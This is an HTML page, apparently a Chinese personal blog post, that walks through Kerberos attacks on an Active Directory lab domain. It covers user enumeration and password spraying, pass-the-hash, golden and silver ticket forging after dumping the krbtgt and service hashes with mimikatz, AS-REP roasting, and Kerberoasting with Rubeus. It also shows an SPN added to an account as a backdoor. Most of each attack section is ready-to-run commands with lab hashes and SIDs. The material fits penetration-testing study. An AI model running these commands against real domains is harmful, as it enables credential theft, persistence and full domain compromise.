@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <title>
+        
+          Kerberos协议利用 - Kat | Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://spanning-tree.xyz/2022/05c2883ac0.html">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS --> 
+    <link rel="stylesheet" href="/css/beantech.min.css">
+
+    <link rel="stylesheet" href="/css/donate.css">
+    
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <link rel="stylesheet" href="/css/widget.css">
+
+    <link rel="stylesheet" href="/css/rocket.css">
+
+    <link rel="stylesheet" href="/css/signature.css">
+
+    <link rel="stylesheet" href="/css/toc.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            background-image: url('/img/article_header/article_bg.jpg')
+            /*post*/
+        
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#域渗透" title="域渗透">域渗透</a>
+                            
+                        </div>
+                        <h1>Kerberos协议利用</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by Kat on
+                            2022-05-05
+                        </span>
+                    </div>
+                
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kat</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Modify by Yu-Hsuan Yen -->
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="kerberos协议利用">Kerberos协议利用</h1>
+<blockquote>
+<p>利用Kerberos协议本身的安全问题，实施域内各种攻击手段。</p>
+</blockquote>
+<h2 id="0x01-用户枚举-密码喷洒">0x01 用户枚举、密码喷洒</h2>
+<h3 id="原理分析">原理分析</h3>
+<p>在Kerberos认证的AS_REQ阶段，客户端向AS服务发起认证请求，AS根据请求中的用户名、密码字段给客户端不同的响应。根据不同的响应特征可以实施用户枚举和密码喷洒攻击。</p>
+<p>该阶段的攻击可在域外或域内，只要我们能够访问域控制器的88端口（Kerberos服务）即可。</p>
+<h3 id="攻击方法">攻击方法</h3>
+<h4 id="kerbrute">kerbrute</h4>
+<p><code>[https://github.com/ropnop/kerbrute/release](https://github.com/ropnop/kerbrute/release)</code><br>
+枚举用户</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">域外</span><br><span class="line">kerbrute_windows_amd64.exe userenum --dc <span class="number">192.168</span><span class="number">.40</span><span class="number">.132</span> -d spanning-tree user.txt</span><br><span class="line"></span><br><span class="line">域内(在域内可不指定dc ip)</span><br><span class="line">kerbrute_windows_amd64.exe userenum -d spanning-tree.org user.txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2aa95vgz7j20qo09d0vd.jpg" alt="image.png"><br>
+<img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2aa9903t7j20mg0b6wg8.jpg" alt="image.png"><br>
+<strong>kerbrute 密码喷洒</strong><br>
+默认情况下域用户不锁定的，锁定策略需要手动开启。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe userenum  -d spanning-tree.org user.txt <span class="number">123456</span></span><br></pre></td></tr></table></figure>
+<p>TIPS：在域外进行密码喷洒的时候域控时间和外部时间不一致，或者时差相差太多会导致无法喷洒成功。这种情况是因为Kerberos在多数认证过程中都会校验时间，如果相差太多就直接终止认证。</p>
+<h4 id="pykerbrute">pykerbrute</h4>
+<p><strong>枚举用户</strong><br>
+<code>[https://github.com/3gstudent/pyKerbrute](https://github.com/3gstudent/pyKerbrute)</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EnumADUser.py <span class="number">192.168</span><span class="number">.40</span><span class="number">.132</span> spanning-tree.org user.txt tcp</span><br></pre></td></tr></table></figure>
+<p><strong>pykerbrute 密码喷洒</strong><br>
+该工具可以针对mtlnhash进行密码喷洒</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ADPwdSpray.py <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> spanning-tree.org user.txt clearpassword DomainUser123! tcp</span><br><span class="line"></span><br><span class="line">ADPwdSpray.py <span class="number">192.168</span><span class="number">.1</span><span class="number">.1</span> spanning-tree.org user.txt ntlmhash e00045bd566a1b74386f5c1e3612921b udp</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2aaaacq9tj20tt08bdij.jpg" alt="image.png"></p>
+<h2 id="0x02-哈希传递">0x02 哈希传递</h2>
+<h3 id="原理分析">原理分析</h3>
+<p>在kerberos认证过程中用户的认证信息是使用用户的hash进行加密后发送的，当AS接收到用户的凭证时候，AS存有用户的hash可以解密。<br>
+所以我们可以在第一阶段认证的时候使用用户的hash</p>
+<h3 id="攻击方法">攻击方法</h3>
+<p>因为UAC的影响，在工作组环境中只有rid为500的域用户才可以PTH；在域环境中在域管组才可以PTH。</p>
+<h4 id="mimikatz">mimikatz</h4>
+<p><strong>使用此方法必须具备本地管理员权限，所以在域内几乎无法使用mimikatz</strong></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">mimikatz # sekurlsa::pth /user:zhangsan /domain:spanning-tree.org /ntlm:594ba03f9dd6874f8cee671c26e31a2a</span><br></pre></td></tr></table></figure>
+<h4 id="impacket">impacket</h4>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py spanning-tree.org/administrator@<span class="number">192.168</span><span class="number">.40</span><span class="number">.132</span> -hashes aad3b435b51404eeaad3b435b51404ee:<span class="number">85</span>a99f6f97db22fe110bfb0961b2d805</span><br><span class="line">等</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2aaa65u6ej21go05fac8.jpg" alt="image.png"></p>
+<h2 id="0x03-黄金票据">0x03 黄金票据</h2>
+<h3 id="原理分析">原理分析</h3>
+<p><strong>在Kerberos认证的AS_REQ阶段，用户认证成功后会返回TGT票据；TGT票据的签发是通过krbtgt hash进行加密。当我们获取到krbtgt用户的hash时就可以任意的签发TGT票据，并且在伪造的20分钟内不会校验真伪。</strong></p>
+<h3 id="攻击方法">攻击方法</h3>
+<h4 id="mimikatz">mimikatz</h4>
+<p>导出krbtgt用户hash</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::dcsync /domain:spanning-tree.org /user:krbtgt</span><br><span class="line"></span><br><span class="line">SID：S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3269375421</span><span class="number">-181298905</span><span class="number">-1254561410</span><span class="number">-502</span></span><br><span class="line"></span><br><span class="line">Hash NTLM: <span class="number">257161</span>ba130cf9f543509f4f14f25f40</span><br><span class="line">aes256_hmac：b6edb81920356c9e165b7844ea5152be8153fad6e2b9b3b6a17aac1af14b0457</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2aaaieh7rj20m60m1wh3.jpg" alt="image.png"><br>
+生成黄金票据</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:spanning-tree.org /admin:administrator /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3269375421</span><span class="number">-181298905</span><span class="number">-1254561410</span> /krbtgt:<span class="number">257161</span>ba130cf9f543509f4f14f25f40 /ticket:administrator.kiribi</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2aaarssxkj216c09it9y.jpg" alt="image.png"><br>
+将票据注入内存中</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt administrator.kiribi</span><br><span class="line">kerberos::tgt</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2aaavel9aj20kx08gwfm.jpg" alt="image.png"><br>
+在域外如果要对域控进行攻击需要将DNS指向域内DNS服务器，且注入的令牌只在管理员权限下才能调用。<br>
+<img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2aab0rbh6j20zz0didjn.jpg" alt="image.png"><br>
+<img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2aab767p9j20mk0ibgpu.jpg" alt="image.png"></p>
+<h4 id="impacket">impacket</h4>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ticket.py -nthash <span class="number">257161</span>ba130cf9f543509f4f14f25f40 -domain-sid S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3269375421</span><span class="number">-181298905</span><span class="number">-1254561410</span> -domain spanning-tree.org administrator</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2aabde2mxj21gt099tbv.jpg" alt="image.png"><br>
+设置环境变量</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Windows:</span><br><span class="line">set KRB5CCNAME=C:\Users\Administrator\Desktop\impacket<span class="number">-0.9</span><span class="number">.24</span>\\examples\\administrator.ccache</span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line"><span class="keyword">export</span> KRB5CCNAME=<span class="regexp">/home/u</span>ser/ticket.ccache</span><br><span class="line">cat $KRB5CCNAME</span><br></pre></td></tr></table></figure>
+<p>检测是否成功</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py spanning-tree.org/administrator@WIN-SJD97LJQLJP -k -no-pass</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2aabjz3dmj216z07gach.jpg" alt="image.png"><br>
+利用impacket工具包生成的黄金票据无法通过net use建立IPC连接但是可以通过impacket系列工具执行命令，其hostname名称可以通过ping -a IP进行解析。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxx.py domain/username@hostname -k -no-pass</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-as-roasting">0x04 AS-Roasting</h2>
+<h3 id="原理分析">原理分析</h3>
+<p>如果域用户关闭的“预身份验证”，攻击者将以任意用户请求TGT票据而KDC并不会做验证，攻击者就会得到TGT票据和用户hash加密的session_key。<br>
+攻击这可针对hash加密的session_key进行破解，如果破解成功攻击者可以获取用户的明文密码。</p>
+<h3 id="攻击方法">攻击方法</h3>
+<p>使用Rubeus自动查找所有不需要预身份验证的帐户，并提取脱机破解所需的加密 TGT 数据。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asreproast /format:hashcat /outfile:C:\Users\lisi\Desktop\<span class="number">1.</span>txt</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2aabqdol8j20pm0bg0tz.jpg" alt="image.png"><br>
+随后使用针对保存的hash进行离线破解即可。</p>
+<h2 id="0x05-白银票据">0x05 白银票据</h2>
+<h3 id="原理分析">原理分析</h3>
+<p>在Kerberos认证的第二个阶段，用户拿着TGT票据向服务请求签发TGS票据。TGS票据是通过服务的hash进行加密的，如果攻击者获取到服务的hash值那么就可以签发任意用户的对应TGS票据。</p>
+<h3 id="攻击方法">攻击方法</h3>
+<h4 id="mimikatz">mimikatz</h4>
+<p>使用白银票据伪造LDAP服务权限<br>
+获取服务账号的NTLM哈希</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonPasswords</span><br><span class="line"></span><br><span class="line">NTLM: <span class="number">325</span>b92ac27746315a7caf8fba0b71c3f</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2aabtqqfuj20m30jk42c.jpg" alt="image.png"><br>
+当前权限无法使用dcsync与域控进行同步</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /dc:WIN-SJD97LJQLJP.spanning-tree.org /domain:spanning-tree.org /user:krbtgt</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2aabztdekj20pz03ht9p.jpg" alt="image.png"><br>
+伪造白银票据获取LDAP访问权限</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:spanning-tree.org /sid:S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3269375421</span><span class="number">-181298905</span><span class="number">-1254561410</span> /target:WIN-SJD97LJQLJP.spanning-tree.org /service:LDAP /rc4:<span class="number">325</span>b92ac27746315a7caf8fba0b71c3f /user:Administrator /ptt</span><br></pre></td></tr></table></figure>
+<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2aac4j8oxj20q40qs0z4.jpg" alt="image.png"></p>
+<h4 id="impacket">impacket</h4>
+<p>伪造白银票据获取LDAP权限</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ticketer.py -nthash <span class="number">325</span>b92ac27746315a7caf8fba0b71c3f -domain-sid S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3269375421</span><span class="number">-181298905</span><span class="number">-1254561410</span> -domain spanning-tree.org -dc WIN-SJD97LJQLJP.spanning-tree.org -spn ldap/WIN-SJD97LJQLJP.spanning-tree.org silver</span><br></pre></td></tr></table></figure>
+<h2 id="0x06-kerberosoast攻击">0x06 Kerberosoast攻击</h2>
+<h3 id="原理分析">原理分析</h3>
+<p>出现该攻击因为TGS_REQ阶段用户发送TGT票据，服务不管是否有权限均返回ST票据；ST票据是由服务的hash进行加密，所以可以针对ST票据的哈希进行破解进而获取服务的明文密码。</p>
+<h3 id="攻击方法">攻击方法</h3>
+<p>使用Rubeus去寻找高权限的域账户，并未发现。<br>
+<img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2aac971xrj20lr0bcjsn.jpg" alt="image.png"><br>
+这里手动给域账户添加SPN服务（需要域管权限)，可用作后门。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A VNC/DESKTOP-FQBK8L8.spanning-tree.org lisi</span><br></pre></td></tr></table></figure>
+<p>我们再次使用Rubeus可发现lisi域账户注册SPN服务<br>
+<img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2aaccfgjtj20o6047js6.jpg" alt="image.png"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast /format:hashcat /outfile:C:\Users\administrator\Desktop\<span class="number">1.</span>txt</span><br></pre></td></tr></table></figure>
+<p>获取其ST票据后，可使用hastcat进行加密。针对高权限账户可注册SPN服务，这样我们就可以随时获取该用户的ST票据进行破解。<br>
+<img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h2aacg3y84j20uv0jtn36.jpg" alt="image.png"></p>
+
+                
+
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    
+                        <li class="next">
+                            <a href="/2022/052d21762d.html" data-toggle="tooltip" data-placement="top" title="Kerberos协议">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                <br>
+
+                <!--打赏-->
+                
+                <!--打赏-->
+
+                <br>
+                <!--分享-->
+                
+                    <div class="social-share"  data-wechat-qrcode-helper="" align="center"></div>
+                    <!--  css & js -->
+                    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+                    <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+                
+                <!--分享-->
+                <br>                       
+                
+                <!-- require APlayer -->
+                
+
+                <!-- duoshuo Share start -->
+                
+                <!-- 多说 Share end-->
+
+                <!-- 多说评论框 start -->
+                
+                <!-- 多说评论框 end -->
+
+                <!-- disqus comment start -->
+                
+                <!-- disqus comment end -->
+
+                
+
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+  
+    <style>
+      span.toc-nav-number{
+        display: none
+      }
+    </style>
+  
+    
+      <aside id="sidebar">
+        <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#kerberos协议利用"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Kerberos&#x534F;&#x8BAE;&#x5229;&#x7528;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x01-用户枚举-密码喷洒"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">0x01 &#x7528;&#x6237;&#x679A;&#x4E3E;&#x3001;&#x5BC6;&#x7801;&#x55B7;&#x6D12;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#原理分析"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">&#x539F;&#x7406;&#x5206;&#x6790;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#攻击方法"><span class="toc-nav-number">1.1.2.</span> <span class="toc-nav-text">&#x653B;&#x51FB;&#x65B9;&#x6CD5;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#kerbrute"><span class="toc-nav-number">1.1.2.1.</span> <span class="toc-nav-text">kerbrute</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#pykerbrute"><span class="toc-nav-number">1.1.2.2.</span> <span class="toc-nav-text">pykerbrute</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x02-哈希传递"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">0x02 &#x54C8;&#x5E0C;&#x4F20;&#x9012;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#原理分析"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">&#x539F;&#x7406;&#x5206;&#x6790;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#攻击方法"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">&#x653B;&#x51FB;&#x65B9;&#x6CD5;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#mimikatz"><span class="toc-nav-number">1.2.2.1.</span> <span class="toc-nav-text">mimikatz</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#impacket"><span class="toc-nav-number">1.2.2.2.</span> <span class="toc-nav-text">impacket</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x03-黄金票据"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">0x03 &#x9EC4;&#x91D1;&#x7968;&#x636E;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#原理分析"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">&#x539F;&#x7406;&#x5206;&#x6790;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#攻击方法"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">&#x653B;&#x51FB;&#x65B9;&#x6CD5;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#mimikatz"><span class="toc-nav-number">1.3.2.1.</span> <span class="toc-nav-text">mimikatz</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#impacket"><span class="toc-nav-number">1.3.2.2.</span> <span class="toc-nav-text">impacket</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x04-as-roasting"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">0x04 AS-Roasting</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#原理分析"><span class="toc-nav-number">1.4.1.</span> <span class="toc-nav-text">&#x539F;&#x7406;&#x5206;&#x6790;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#攻击方法"><span class="toc-nav-number">1.4.2.</span> <span class="toc-nav-text">&#x653B;&#x51FB;&#x65B9;&#x6CD5;</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x05-白银票据"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">0x05 &#x767D;&#x94F6;&#x7968;&#x636E;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#原理分析"><span class="toc-nav-number">1.5.1.</span> <span class="toc-nav-text">&#x539F;&#x7406;&#x5206;&#x6790;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#攻击方法"><span class="toc-nav-number">1.5.2.</span> <span class="toc-nav-text">&#x653B;&#x51FB;&#x65B9;&#x6CD5;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#mimikatz"><span class="toc-nav-number">1.5.2.1.</span> <span class="toc-nav-text">mimikatz</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#impacket"><span class="toc-nav-number">1.5.2.2.</span> <span class="toc-nav-text">impacket</span></a></li></ol></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x06-kerberosoast攻击"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">0x06 Kerberosoast&#x653B;&#x51FB;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#原理分析"><span class="toc-nav-number">1.6.1.</span> <span class="toc-nav-text">&#x539F;&#x7406;&#x5206;&#x6790;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#攻击方法"><span class="toc-nav-number">1.6.2.</span> <span class="toc-nav-text">&#x653B;&#x51FB;&#x65B9;&#x6CD5;</span></a></li></ol></li></ol></li></ol>
+        
+        </div>
+      </aside>
+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#域渗透" title="域渗透">域渗透</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+<!-- chrome Firefox 中文锚点定位失效-->
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.js"></script>
+<!-- smooth scroll behavior polyfill  -->
+<script type="text/javascript" src="/js/smoothscroll.js"></script>
+<script>
+        $('#toc').on('click','a',function(a){
+            // var isChrome = window.navigator.userAgent.indexOf("Chrome") !== -1;
+            // console.log(window.navigator.userAgent,isChrome)
+                // if(isChrome) {
+                    // console.log(a.currentTarget.outerHTML);
+                    // console.log($(a.currentTarget).attr("href"));
